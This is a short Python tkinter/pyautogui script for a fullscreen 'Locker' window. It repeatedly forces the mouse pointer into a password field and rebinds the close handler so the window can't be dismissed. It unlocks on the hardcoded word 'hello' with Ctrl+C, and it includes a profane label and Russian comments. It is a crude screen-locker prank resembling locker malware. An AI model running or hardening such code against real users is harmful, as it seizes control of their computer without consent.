from tkinter import Tk, Entry, Label #for work window
from pyautogui import click, moveTo # work pointer
from time import sleep

def callback(event): 
	global k, entry
	if entry.get() == 'hello':
		k = True 

def on_closing():
	click(675,420)
	moveTo(675,420)
	root.attributes('-fullscreen', True) # no resize window
	root.protocol('WM_DELETE_WINDOW', on_closing) # при закрытии окна, сработает снова онклосинг
	root.update()
	root.bind('<Control-KeyPress-c>', callback)# проверкуа на введенный пароль,
root = Tk() # create window
root.title('Locker')
root.attributes('-fullscreen', True)
entry = Entry(root, font=1) # field input
entry.place(width=150, height=50, x=600, y=400)
label0 = Label(root, text='Locker fuck', font=1)
label0.grid(row=0, column=0)
label1 = Label(root, text='Write password and press crtl+c', font='20')
label1.place(x=470, y=300)
root.update()
sleep(0.2)
click(675, 420)
k = False
while k != True:
	on_closing()


